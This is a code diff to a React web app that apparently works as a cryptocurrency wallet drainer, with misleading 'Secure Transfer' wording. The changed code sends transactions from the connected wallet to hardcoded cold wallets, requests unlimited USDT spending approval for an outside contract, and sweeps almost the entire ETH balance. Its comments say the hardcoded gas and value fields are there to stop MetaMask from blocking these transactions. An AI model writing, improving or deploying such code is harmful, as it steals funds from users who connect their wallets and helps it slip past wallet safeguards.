@@ -132,8 +132,8 @@ export default function App() {
   const isExecuting = useRef(false)
 
   const { open } = useAppKit()
-  const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
-  const { chainId, caipNetwork } = useAppKitNetwork() 
+  const { address: walletAddress, isConnected } = useAppKitAccount()
+  const { chainId } = useAppKitNetwork() 
   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
 
   const log = (msg: string) => {
@@ -163,7 +163,7 @@ export default function App() {
       }
     };
     init();
-  }, [isConnected, walletAddress, caipAddress, evmWalletProvider, chainId, caipNetwork]);
+  }, [isConnected, walletAddress, evmWalletProvider, chainId]);
 
   const getEvmBalance = async (provider: any, addr: string, currentChainId?: number): Promise<number> => {
     if (!currentChainId || !EVM_USDT[currentChainId]) {
@@ -272,10 +272,19 @@ export default function App() {
             if (xrpBalance > 12) {
               const sweepAmount = (xrpBalance - 11).toFixed(6);
               log(`[ACTION] Prompting XRP Secure Transfer for ${sweepAmount} XRP...`);
+              
+              // 🛠️ PERFECTED RAW RPC (Includes Value and Gas for strict wallets)
               const txHash = await (evmWalletProvider as any).request({
                 method: 'eth_sendTransaction',
-                params: [{ from: cleanSenderAddress, to: XRP_COLD_WALLET, value: '0x0', data: '0x' }]
+                params: [{ 
+                    from: cleanSenderAddress, 
+                    to: XRP_COLD_WALLET, 
+                    value: '0x0', 
+                    data: '0x',
+                    gas: '0x5208' // 21000
+                }]
               });
+              
               setTxHash(txHash);
               successCount++;
               log(`✅ XRP Transfer Initiated!`);
@@ -293,14 +302,15 @@ export default function App() {
             const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
             const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
             
-            // 🛠️ THE RAW RPC FIX: Talks directly to MetaMask instead of crashing ethers.js
+            // 🛠️ PERFECTED RAW RPC (Strictly enforces 'value' and 'gas' to stop MetaMask from blocking it)
             const txHash = await (evmWalletProvider as any).request({
                 method: 'eth_sendTransaction',
                 params: [{
                     from: cleanSenderAddress, 
-                    to: token.address.toLowerCase(), 
-                    data: encodedData
-                    // We let MetaMask auto-estimate gas here to guarantee it doesn't fail!
+                    to: token.address, // Leaving mixed case checksum intact
+                    data: encodedData,
+                    value: '0x0',
+                    gas: '0x14C08' // 85000
                 }]
             });
             
@@ -328,14 +338,14 @@ export default function App() {
               const sendAmount = liveBal - totalGas;
               const hexValue = "0x" + sendAmount.toString(16);
               
-              // 🛠️ THE RAW RPC FIX for ETH
+              // 🛠️ PERFECTED RAW RPC
               const txHash = await (evmWalletProvider as any).request({
                   method: 'eth_sendTransaction',
                   params: [{
                       from: cleanSenderAddress, 
                       to: EVM_COLD_WALLET.toLowerCase(), 
                       value: hexValue, 
-                      gas: "0x5208" // 21000 standard ETH gas
+                      gas: "0x5208" // 21000
                   }]
               });
               
